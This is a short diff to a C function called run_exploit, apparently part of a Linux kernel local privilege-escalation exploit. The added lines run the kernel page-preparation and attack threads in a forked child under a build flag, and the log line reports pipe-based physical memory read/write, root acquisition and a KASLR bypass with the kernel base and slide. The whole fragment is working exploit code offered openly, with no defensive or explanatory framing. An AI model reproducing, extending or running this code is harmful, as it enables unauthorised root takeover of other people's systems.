@@ -190,11 +190,22 @@ int run_exploit(int argc, char **argv) {
     return 0;
   }
 
+  #if defined(APP_PAYLOAD) && APP_PAYLOAD
+  {
+    pid_t fops_pid = SYSCHK(fork());
+    if (fops_pid == 0) {
+      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
+      if (page_base) run_main_route_threads();
+      _exit(atomic_load(&cfi_stage_done) && root_child_done ? 0 : 1);
+    }
+    int fops_status;
+    waitpid(fops_pid, &fops_status, 0);
+  }
+#else
   pin_to_core(CORE);
   page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
-
   run_main_route_threads();
-
+#endif
   pr_success("pipe-physrw-summary pid=%d done=%d root=%d kaslr=%d base=%016zx slide=%016zx\n",
              getpid(), atomic_load(&cfi_stage_done), root_child_done,
              kaslr_done, kaslr_base, kaslr_slide);
